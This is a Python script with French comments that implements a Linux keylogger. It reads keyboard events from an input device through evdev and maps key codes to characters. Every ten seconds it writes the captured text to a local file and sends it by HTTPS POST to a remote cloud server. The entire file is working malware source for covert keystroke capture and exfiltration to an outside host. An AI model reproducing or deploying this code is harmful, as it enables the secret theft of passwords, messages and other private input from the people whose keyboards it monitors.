#!/usr/bin/python3
import evdev
import threading
import requests
import time

# Configuration du serveur cloud (HTTPS)
SERVER_IP = "server803632.westeurope.cloudapp.azure.com"  # Remplacez par le domaine ou IP de votre serveur
SERVER_PORT = 5589                # Port HTTPS configuré sur le serveur (ex: 443 ou autre)
SEND_INTERVAL = 10                # Envoi toutes les 10 secondes

# Chemin du périphérique clavier et fichier de log local
DEVICE_PATH = "/dev/input/event2"
LOCAL_LOG_FILE = "/home/azureuser/server/typed_keys.txt"

# Mapping des touches vers des caractères
key_map = {
    'KEY_A': 'a', 'KEY_B': 'b', 'KEY_C': 'c', 'KEY_D': 'd', 'KEY_E': 'e',
    'KEY_F': 'f', 'KEY_G': 'g', 'KEY_H': 'h', 'KEY_I': 'i', 'KEY_J': 'j',
    'KEY_K': 'k', 'KEY_L': 'l', 'KEY_M': 'm', 'KEY_N': 'n', 'KEY_O': 'o',
    'KEY_P': 'p', 'KEY_Q': 'q', 'KEY_R': 'r', 'KEY_S': 's', 'KEY_T': 't',
    'KEY_U': 'u', 'KEY_V': 'v', 'KEY_W': 'w', 'KEY_X': 'x', 'KEY_Y': 'y',
    'KEY_Z': 'z',
    'KEY_1': '1', 'KEY_2': '2', 'KEY_3': '3', 'KEY_4': '4', 'KEY_5': '5',
    'KEY_6': '6', 'KEY_7': '7', 'KEY_8': '8', 'KEY_9': '9', 'KEY_0': '0',
    'KEY_SPACE': ' ',
    'KEY_ENTER': '\n',
    'KEY_BACKSPACE': '<BACKSPACE>',
    'KEY_DOT': '.', 'KEY_COMMA': ',', 'KEY_SLASH': '/',
    'KEY_SEMICOLON': ';', 'KEY_MINUS': '-', 'KEY_EQUAL': '=',
    'KEY_LEFTBRACE': '[', 'KEY_RIGHTBRACE': ']', 'KEY_APOSTROPHE': '\'',
    'KEY_BACKSLASH': '\\', 'KEY_COLON': ':'
}

key_buffer = []
buffer_lock = threading.Lock()

def send_data():
    global key_buffer
    with buffer_lock:
        if key_buffer:
            typed_text = "".join(key_buffer)
            # Sauvegarde locale
            try:
                with open(LOCAL_LOG_FILE, "a") as f:
                    f.write(typed_text)
            except Exception as e:
                print(f"[!] Erreur d'écriture locale : {e}")
            # Envoi via HTTPS
            try:
                response = requests.post(
                    f"https://{SERVER_IP}:{SERVER_PORT}",
                    data=typed_text,
                    timeout=5,
                    verify=True  # Pour test avec certificat auto-signé, mettre False
                )
                print(f"[DEBUG] Envoi au serveur : {response.status_code}, {response.text}")
            except requests.exceptions.RequestException as err:
                print(f"[!] Échec d'envoi : {err}")
            key_buffer.clear()
    threading.Timer(SEND_INTERVAL, send_data).start()

def capture_keys():
    try:
        device = evdev.InputDevice(DEVICE_PATH)
        print(f"[DEBUG] Clavier détecté : {device.name} ({DEVICE_PATH})")
    except Exception as e:
        print(f"[!] Erreur accès clavier : {e}")
        return
    print("[DEBUG] Lecture des frappes…")
    for event in device.read_loop():
        if event.type == evdev.ecodes.EV_KEY and event.value == 1:
            code = evdev.categorize(event).keycode
            mapped_char = key_map.get(code, '')
            with buffer_lock:
                if mapped_char == '<BACKSPACE>':
                    if key_buffer:
                        key_buffer.pop()
                else:
                    key_buffer.append(mapped_char)

if __name__ == "__main__":
    threading.Thread(target=send_data, daemon=True).start()
    capture_keys()
